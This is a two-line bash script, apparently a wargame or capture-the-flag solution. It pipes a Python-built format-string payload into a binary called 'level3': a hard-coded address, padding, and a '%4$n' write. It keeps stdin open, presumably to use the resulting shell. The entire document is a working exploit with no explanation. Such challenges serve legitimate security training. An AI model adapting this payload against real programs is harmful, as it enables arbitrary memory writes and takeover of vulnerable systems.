#!/bin/bash
cat <(python -c "print('\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n')") - | ./level3
